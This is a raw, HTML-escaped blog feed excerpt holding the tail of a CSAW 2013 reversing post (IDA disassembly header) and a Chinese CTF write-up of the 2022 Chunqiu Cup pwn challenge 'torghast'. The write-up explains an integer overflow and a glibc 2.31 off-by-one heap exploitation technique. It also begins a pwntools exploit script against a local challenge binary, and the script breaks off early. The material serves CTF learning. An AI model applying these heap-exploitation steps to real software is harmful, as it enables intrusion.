class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; +-------------------------------------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; |      This file was generated by The Interactive &lt;span class=&#34;title function_&#34;&gt;Disassembler&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(IDA)&lt;/span&gt;      |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00401000 ; |           Copyright (c) &lt;span class=&#34;number&#34;&gt;2020&lt;/span&gt; Hex-Rays, &amp;lt;support@hex-rays.com&amp;gt;           |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; |                      License info: &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-5947&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-5F&lt;/span&gt;4E&lt;span class=&#34;number&#34;&gt;-42&lt;/span&gt;                      |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; |                      P.Y.G Team, Personal license                       |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; +-------------------------------------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Input SHA256 : F6BCC742755C60202D85EDD7307567103C8804F2249D16591040A3390E571CBE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Input MD5    : &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;D47DDF04CC6A8120C400A5F304E3ED6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Input CRC32  : &lt;span class=&#34;number&#34;&gt;4F&lt;/span&gt;14BDF8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; File Name   : C:\Users\&lt;span class=&#34;number&#34;&gt;32644&lt;/span&gt;\Desktop\reverse\csaw2013reversing2\&lt;span class=&#34;number&#34;&gt;0453&lt;/span&gt;d21297a743e199d8a7de75179e52 (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;).exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Format      : Portable executable &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;80386&lt;/span&gt; (PE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Imagebase   : &lt;span class=&#34;number&#34;&gt;400000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Timestamp   : &lt;span class=&#34;number&#34;&gt;54123&lt;/span&gt;A17 (Fri Sep &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2014&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Section &lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt; (virtual address &lt;span class=&#34;number&#34;&gt;00001000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Virtual size                  : &lt;span class=&#34;number&#34;&gt;000044&lt;/span&gt;D2 (  &lt;span class=&#34;number&#34;&gt;17618.&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Section size in file          : &lt;span class=&#34;number&#34;&gt;00004600&lt;/span&gt; (  &lt;span class=&#34;number&#34;&gt;17920.&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Offset to raw data &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; section: &lt;span class=&#34;number&#34;&gt;00000400&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Flags &lt;span class=&#34;number&#34;&gt;60000020&lt;/span&gt;: Text Executable Readable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Alignment     : &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; PDB File Name : C:\Users\exploitation\documents\visual studio &lt;span class=&#34;number&#34;&gt;2010&lt;/span&gt;\Projects\csaw2013reversing2\Release\csaw2013reversing2.pdb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; OS type         :  MS Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt; ; Application type:  Executable &lt;span class=&#34;number&#34;&gt;32b&lt;/span&gt;it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt;                 &lt;span class=&#34;number&#34;&gt;.686&lt;/span&gt;p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt;                 .mmx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00401000&lt;/span&gt;                 .model flat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00405600&lt;/span&gt; _text           ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;00405600&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.idata:&lt;span class=&#34;number&#34;&gt;00406000&lt;/span&gt; ; Section &lt;span class=&#34;number&#34;&gt;2.&lt;/span&gt; (virtual address &lt;span class=&#34;number&#34;&gt;00006000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个两个基址，其实是相对地址，也就是关于镜像基址（BaseOfImage）的偏移&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/10/torghast/</guid>
            <title>torghast</title>
            <link>http://example.com/2022/05/10/torghast/</link>
            <category>writeup</category>
            <pubDate>Tue, 10 May 2022 18:29:08 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;202205-春秋杯-pwn-torghast&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#202205-春秋杯-pwn-torghast&#34;&gt;#&lt;/a&gt; 202205 春秋杯 pwn torghast&lt;/h1&gt;
&lt;h2 id=&#34;环境及保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境及保护&#34;&gt;#&lt;/a&gt; 环境及保护&lt;/h2&gt;
&lt;p&gt;2.31 的堆题目&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checksec --file=pwn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		2		pwn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ strings libc-2.31.so | grep ubuntu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https://bugs.launchpad.net/ubuntu/+&lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;题目分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目分析&#34;&gt;#&lt;/a&gt; 题目分析&lt;/h2&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h2&gt;
&lt;p&gt;我们要想正常做堆题，就必须获得 GM 权限，通过 use magic，造成整数溢出（将 mp 弄成负数），然后闯关，获得 GM 权限&lt;/p&gt;
&lt;p&gt;题目存在空字符的 off-by-one, 但是因为是高版本的 glibc，就导致了修改 chunksize 最低位，触发 unlink 向前合并失效&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* consolidate backward */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!prev_inuse(p)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      prevsize = prev_size (p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      size += prevsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      p = chunk_at_offset(p, -((&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) prevsize));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (chunksize(p) != prevsize))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;corrupted size vs. prev_size while consolidating&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      unlink_chunk (av, p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里检查了前 chunk 的 size 与我们释放堆块的 prev_size 是否相等，我 i 们想利用堆块合并构造 overlap 就无效了。一般来说绕过方式是在 chunk 内部伪造一个 chunk, 但是前提是我们可以知道堆地址。&lt;/p&gt;
&lt;p&gt;首先物品们通过 unsortedbins 泄露出 libc 以及 chunksize，就可以后面继续 overlap 了&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp:&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;/home/dreamcat/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;getGM&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;GM&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;GM&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;GM&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;GM&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span 